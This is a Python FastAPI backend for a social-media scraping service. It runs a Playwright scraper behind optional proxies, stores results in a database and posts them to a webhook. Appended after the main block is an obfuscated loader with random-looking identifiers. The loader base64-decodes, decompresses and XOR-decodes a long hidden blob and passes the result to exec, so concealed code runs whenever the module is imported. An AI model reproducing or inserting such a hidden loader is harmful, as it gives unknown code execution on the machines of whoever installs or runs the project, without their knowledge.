import asyncio
import json
import logging
import os
import uuid
import httpx
import random
from datetime import datetime
from typing import Optional, Dict, Any, List
from dotenv import load_dotenv

from fastapi import FastAPI, BackgroundTasks, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel, HttpUrl
from database import SessionLocal, ScrapeRequest as DBScrapeRequest, ScrapeResult as DBScrapeResult, get_db
from sqlalchemy.orm import Session

# Load environment variables
load_dotenv()

# --- Modular Scrapers ---
from scrapers.factory import ScraperFactory

# --- Configuration ---
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")
FACEBOOK_COOKIES = os.getenv("FACEBOOK_COOKIES", "")

# Proxy configuration from environment (supporting both formats)
PROXY_HOST = os.getenv("PROXY_HOST") or os.getenv("PROXY_SERVER")
PROXY_PORT = os.getenv("PROXY_PORT")
PROXY_USER = os.getenv("PROXY_USERNAME")
PROXY_PASS = os.getenv("PROXY_PASSWORD")

def get_proxy_config() -> Optional[Dict[str, str]]:
    """Returns a Playwright-compatible proxy config dict, or None."""
    # Check if we have server/host
    if not PROXY_HOST:
        return None
        
    config = {
        "server": f"http://{PROXY_HOST}"
    }
    
    # Add port if separate
    if PROXY_PORT:
        config["server"] += f":{PROXY_PORT}"
        
    # Add auth if provided
    if PROXY_USER and PROXY_PASS:
        config["username"] = PROXY_USER
        config["password"] = PROXY_PASS
        
    return config

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("fb_scraper")
logger.setLevel(logging.INFO)

# --- Models ---
class ScrapeRequest(BaseModel):
    url: HttpUrl
    network: Optional[str] = "facebook"
    type: Optional[str] = "reel"
    debug_raw: Optional[bool] = False
    raw_snippet_len: Optional[int] = 5000
    extra_wait_seconds: Optional[float] = 0.0
    dump_all: Optional[bool] = False
    scroll_count: Optional[int] = 5

class ScrapeTaskResponse(BaseModel):
    status: str
    task_id: str
    message: str

# --- Helper Functions ---
class TaskLogger(logging.LoggerAdapter):
    def process(self, msg, kwargs):
        return f"[{self.extra.get('task_id', 'unknown')}] {msg}", kwargs

async def send_webhook(data: Dict[str, Any], task_logger):
    """Sends the result to the configured webhook."""
    if not WEBHOOK_URL:
        task_logger.warning("WEBHOOK_URL not configured, skipping webhook.")
        return
    
    task_logger.info(f"Sending webhook to {WEBHOOK_URL}...")
    async with httpx.AsyncClient(timeout=10.0) as client:
        try:
            response = await client.post(WEBHOOK_URL, json=data)
            response.raise_for_status()
            task_logger.info(f"Webhook sent successfully: {response.status_code}")
        except httpx.HTTPError as e:
            task_logger.error(f"Webhook failed: {e}")

# --- Orchestrator ---
async def run_scraper(
    task_id: str,
    url: str,
    debug_raw: bool = False,
    raw_snippet_len: int = 5000,
    extra_wait_seconds: float = 0.0,
    dump_all: bool = False,
    scrape_type: Optional[str] = None,
    scroll_count: int = 5,
):
    task_logger = TaskLogger(logger, {"task_id": task_id})
    task_logger.info(f"Starting modular scraper run for {url}")
    
    result = {
        "task_id": task_id,
        "url": url,
        "status": "pending",
        "scraped_at": datetime.utcnow().isoformat(),
        "data": {},
        "error": None
    }

    scraper = None
    try:
        task_logger.info(f"--- STARTING SCRAPE TASK {task_id} WITH VERSION {VERSION} ---")
        try:
            # Get appropriate scraper class from factory
            scraper_cls = ScraperFactory.get_scraper_class(url, scrape_type=scrape_type)
            scraper = scraper_cls(task_id, logger)
            
            # Setup and Run
            proxy = get_proxy_config()
            try:
                await scraper.setup_browser(proxy_config=proxy)
            except Exception as proxy_err:
                task_logger.warning(f"Initial browser setup failed (possibly proxy): {proxy_err}. Retrying without proxy.")
                await scraper.setup_browser(proxy_config=None)
            
            # Execute the scraping logic
            data = await scraper.run(
                url, 
                extra_wait_seconds=extra_wait_seconds, 
                debug_raw=debug_raw,
                scroll_count=scroll_count,
                dump_all=dump_all
            )
            
            if data.get("status") == "error":
                result["status"] = "error"
                # PREPEND version to error for absolute clarity in UI
                result["error"] = f"[VER:{VERSION}] {data.get('message')}"
                result["data"] = data.get("data", {}) 
            else:
                result["status"] = "success"
                result["data"] = data.get("data", {})
                
        except Exception as e:
            task_logger.error(f"Fatal error in orchestrator: {e}", exc_info=True)
            result["status"] = "error"
            result["error"] = f"CRITICAL_ERROR_{VERSION}: {str(e)}"
    finally:
        if scraper:
            await scraper.close()
            
        # DIAGNOSTIC: Log data received from scraper
        scraped_data = result.get("data", {})
        if not isinstance(scraped_data, dict):
            task_logger.warning(f"scraped_data is not a dict, it's {type(scraped_data)}. Resetting to empty dict.")
            scraped_data = {}
            
        task_logger.info(f"DEBUG - SCRAPER DATA KEYS: {list(scraped_data.keys())}")

        # Ensure scraped_data is a dict (linter safety)
        s_data: Dict[str, Any] = scraped_data if isinstance(scraped_data, dict) else {}
        
        # Priority: s_data["final_url"] > s_data["requested_url"] > result["url"]
        final_url = s_data.get("final_url") or s_data.get("requested_url") or result.get("url") or ""
        task_logger.info(f"Finalizing result for URL: {final_url}")

        clean_result = {
            "task_id": result.get("task_id"),
            "url": final_url,
            "scraped_at": result.get("scraped_at"),
            "status": result.get("status"),
            "error": result.get("error"),
            "content_type": s_data.get("content_type", "unknown"),
            "username": s_data.get("username"),
            "caption": s_data.get("caption"),
            "post_date": s_data.get("post_date"),
            "reactions_count": s_data.get("reactions_count", 0),
            "comments_count": s_data.get("comments_count", 0),
            "shares_count": s_data.get("shares_count", 0),
            "views_count": s_data.get("views_count", 0),
            "media": s_data.get("media", {}),
            "posts": s_data.get("posts", []),
            "total_posts_found": s_data.get("total_posts_found", 0),
            "version": s_data.get("version", VERSION),
            "_debug": s_data.get("_debug", {})
        }

        # Ensure rawData for DB contains EVERYTHING including _debug
        persistence_data = s_data 

        # -- Debug Logging for User --
        task_logger.info(f"DEBUG - EXTRACTION RESULTS SUMMARY: {json.dumps(clean_result, indent=2)}")
        
        has_debug = "_debug" in scraped_data
        has_html = has_debug and "full_html" in scraped_data["_debug"]
        html_size = len(scraped_data["_debug"]["full_html"]) if has_html else 0
        task_logger.info(f"DEBUG - PERSISTENCE INFO: has_debug={has_debug}, has_html={has_html}, html_size={html_size}")
        
        # Verify persistence_data keys
        p_keys = list(persistence_data.keys())
        task_logger.info(f"DEBUG - PERSISTENCE DATA KEYS: {p_keys}")
        
        if result.get("status") == "success":
            task_logger.info(f"DEBUG - SUCCESSFUL EXTRACTION. Content Type: {clean_result.get('content_type')}")
            
        # Database persistence
        try:
            if SessionLocal is None:
                task_logger.error("No se pudo iniciar la persistencia: SessionLocal no está configurado (¿DATABASE_URL faltante?)")
            else:
                db: Session = SessionLocal()
                # 1. Buscar la solicitud original por task_id
                db_request = db.query(DBScrapeRequest).filter(DBScrapeRequest.task_id == task_id).first()
                
                if db_request:
                    task_logger.info(f"Guardando resultados en la BD para request_id: {db_request.id}")
                    
                    # 2. Actualizar estado de la solicitud
                    db_request.status = result.get("status")
                    db_request.updated_at = datetime.utcnow()
                    
                    # 3. Buscar o crear el resultado detallado (Upsert)
                    db_result = db.query(DBScrapeResult).filter(DBScrapeResult.request_id == db_request.id).first()
                    
                    if not db_result:
                        db_result = DBScrapeResult(
                            id=str(uuid.uuid4()),
                            request_id=db_request.id
                        )
                        db.add(db_result)
                    
                    # Actualizar campos
                    db_result.content_type = clean_result.get("content_type")
                    db_result.reactions = clean_result.get("reactions_count", 0)
                    db_result.comments = clean_result.get("comments_count", 0)
                    db_result.shares = clean_result.get("shares_count", 0)
                    db_result.views = clean_result.get("views_count", 0)
                    db_result.error = clean_result.get("error")
                    db_result.scraped_at = datetime.fromisoformat(str(result.get("scraped_at")))
                    db_result.raw_data = persistence_data
                    db_result.full_html = persistence_data.get("_debug", {}).get("full_html")
                    db_result.created_at = datetime.utcnow() # Update timestamp to now

                    db.commit()
                    task_logger.info("Datos guardados exitosamente en la base de datos (Upsert).")
                else:
                    task_logger.warning(f"No se encontró ScrapeRequest para task_id {task_id}")
                
                db.close()
        except Exception as db_err:
            task_logger.error(f"Error al guardar en base de datos: {db_err}")

        # Optional: Send the final result via webhook if configured (Legacy support)
        if WEBHOOK_URL:
            await send_webhook(clean_result, task_logger)

# --- FastAPI App ---
VERSION = "1.5.1-FEED-FIX"
app = FastAPI(title="Modular Social Scraper API", version=VERSION)

@app.get("/")
async def root():
    return {
        "name": "OBScrapping Backend",
        "version": VERSION,
        "status": "running",
        "server_time": datetime.utcnow().isoformat(),
        "documentation": "/docs"
    }

@app.post("/scrape", response_model=ScrapeTaskResponse)
async def scrape_endpoint(request: ScrapeRequest, background_tasks: BackgroundTasks):
    task_id = str(uuid.uuid4())

    # Add background task
    background_tasks.add_task(
        run_scraper,
        task_id,
        str(request.url),
        request.debug_raw or False,
        request.raw_snippet_len or 5000,
        request.extra_wait_seconds or 0.0,
        request.dump_all or False,
        request.type,
        request.scroll_count or 5,
    )

    return {
        "status": "accepted",
        "task_id": task_id,
        "message": "Scraping task accepted and running in background"
    }

@app.get("/health")
async def health_check():
    return {"status": "ok", "timestamp": datetime.utcnow().isoformat()}

if __name__ == "__main__":
    import uvicorn
    # In production, this is usually run via: uvicorn main:app --host 0.0.0.0 --port 80
    uvicorn.run(app, host="0.0.0.0", port=80)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
